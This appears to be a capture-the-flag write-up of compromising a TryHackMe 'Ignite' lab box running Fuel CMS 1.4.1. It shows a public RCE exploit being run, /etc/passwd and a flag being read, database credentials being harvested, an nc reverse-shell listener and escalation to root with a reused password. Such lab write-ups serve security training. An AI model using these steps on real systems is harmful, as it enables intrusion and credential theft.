

![[Pasted image 20251128125628.png]]

--Website is clearly giving us a version of the CMS system so I decided to look it up


┌──(kali㉿kali)-[~]
└─$ searchsploit fuel cms
---------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                            |  Path
---------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                               | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                          | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                        | php/webapps/50884.txt
---------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ find / -name "50477.py" 2>/dev/null
/usr/share/exploitdb/exploits/php/webapps/50477.py
                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/50477.py ~/THM/Ignite

┌──(kali㉿kali)-[~/THM/Ignite]
└─$ python3 50477.py -u http://10.64.152.50
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)

--exploit DB pops off

Enter Command $cat /home/www-data/flag.txt
system6470e394cbf6dab6a91682cc8585059b 

--user flag found

Enter Command $cat /etc/passwd
systemroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false

Enter Command $python3 --version
systemPython 3.5.2


Enter Command $python -c 'import pty; pty.spawn("/bin/bash")'


Enter Command $whoami
systemwww-data

--no free python tendies

--oscp user is interesting but we dont see them in passwd

Enter Command $45:
plugdev:x:46:oscp
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:
messagebus:x:110:
uuidd:x:111:
ssl-cert:x:112:
lpadmin:x:113:oscp
lightdm:x:114:
nopasswdlogin:x:115:
ssh:x:116:
whoopsie:x:117:
mlocate:x:118:
avahi-autoipd:x:119:
avahi:x:120:
bluetooth:x:121:
scanner:x:122:saned
colord:x:123:
pulse:x:124:
pulse-access:x:125:
rtkit:x:126:
saned:x:127:
oscp:x:1000:
sambashare:x:128:oscp
mysql:x:129:
system

┌──(kali㉿kali)-[~/THM/Ignite]
└─$ python3 50477.py -u http://10.64.191.172
[+]Connecting...
Enter Command $ls -la /var
systemtotal 60
drwxr-xr-x 15 root root     4096 Jul 26  2019 .
drwxr-xr-x 24 root root     4096 Jul 26  2019 ..
drwxr-xr-x  2 root root     4096 Nov 28 11:49 backups
drwxr-xr-x 17 root root     4096 Jul 26  2019 cache
drwxrwsrwt  2 root whoopsie 4096 Feb 26  2019 crash
drwxr-xr-x 72 root root     4096 Jul 26  2019 lib
drwxrwsr-x  2 root staff    4096 Apr 12  2016 local
lrwxrwxrwx  1 root root        9 Jul 26  2019 lock -> /run/lock
drwxrwxr-x 15 root syslog   4096 Nov 28 11:49 log
drwxrwsr-x  2 root mail     4096 Feb 26  2019 mail
drwxrwsrwt  2 root whoopsie 4096 Feb 26  2019 metrics
drwxr-xr-x  2 root root     4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root        4 Jul 26  2019 run -> /run
drwxr-xr-x  2 root root     4096 Jan 29  2019 snap
drwxr-xr-x  7 root root     4096 Feb 26  2019 spool
drwxrwxrwt  5 root root     4096 Nov 28 11:44 tmp
drwxr-xr-x  3 root root     4096 Jul 26  2019 www


--no write, no sudo -l, no cron jobs

Enter Command $find / -writable -type d 2>/dev/null

--I did however see many of these were writable

Enter Command $ls -la /var/www/html/fuel/application/config
systemtotal 164
drwxrwxrwx  2 root root  4096 Jul 26  2019 .
drwxrwxrwx 15 root root  4096 Jul 26  2019 ..
-rwxrwxrwx  1 root root   452 Jul 26  2019 MY_config.php
-rwxrwxrwx  1 root root  4156 Jul 26  2019 MY_fuel.php
-rwxrwxrwx  1 root root  1330 Jul 26  2019 MY_fuel_layouts.php
-rwxrwxrwx  1 root root  1063 Jul 26  2019 MY_fuel_modules.php
-rwxrwxrwx  1 root root  2507 Jul 26  2019 asset.php
-rwxrwxrwx  1 root root  3919 Jul 26  2019 autoload.php
-rwxrwxrwx  1 root root 18445 Jul 26  2019 config.php
-rwxrwxrwx  1 root root  4390 Jul 26  2019 constants.php
-rwxrwxrwx  1 root root   506 Jul 26  2019 custom_fields.php
-rwxrwxrwx  1 root root  4646 Jul 26  2019 database.php
-rwxrwxrwx  1 root root  2441 Jul 26  2019 doctypes.php
-rwxrwxrwx  1 root root  4369 Jul 26  2019 editors.php
-rwxrwxrwx  1 root root   547 Jul 26  2019 environments.php
-rwxrwxrwx  1 root root  2993 Jul 26  2019 foreign_chars.php
-rwxrwxrwx  1 root root   421 Jul 26  2019 google.php
-rwxrwxrwx  1 root root   890 Jul 26  2019 hooks.php
-rwxrwxrwx  1 root root   114 Jul 26  2019 index.html
-rwxrwxrwx  1 root root   498 Jul 26  2019 memcached.php
-rwxrwxrwx  1 root root  3032 Jul 26  2019 migration.php
-rwxrwxrwx  1 root root 10057 Jul 26  2019 mimes.php
-rwxrwxrwx  1 root root   706 Jul 26  2019 model.php
-rwxrwxrwx  1 root root   564 Jul 26  2019 profiler.php
-rwxrwxrwx  1 root root  1951 Jul 26  2019 redirects.php
-rwxrwxrwx  1 root root  2269 Jul 26  2019 routes.php
-rwxrwxrwx  1 root root  3181 Jul 26  2019 smileys.php
-rwxrwxrwx  1 root root   680 Jul 26  2019 social.php
-rwxrwxrwx  1 root root  1420 Jul 26  2019 states.php
-rwxrwxrwx  1 root root  6132 Jul 26  2019 user_agents.php

  
Credential Hunting

```shell-session
htb_student@NIX02:~$ grep 'DB_USER\|DB_PASSWORD' wp-config.php
```

referencing HTBA

Enter Command $cat fuel/application/config/database.php

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4242
listening on [any] 4242 ...
ls
connect to [192.168.145.138] from (UNKNOWN) [10.64.191.172] 41140
/bin/sh: 0: can't access tty; job control turned off
$ README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
$ su root
su: must be run from a terminal
$ 
$ python3 c 'import pty; pty.spawn("/bin/sh")'

--lol I guess even tho 'python --version' didnt show anything it is still valid to use

python3: can't open file 'c': [Errno 2] No such file or directory

$ python -c 'import pty; pty.spawn("/bin/sh")'

$ su root
su root
Password: mememe

root@ubuntu:/var/www/html# 
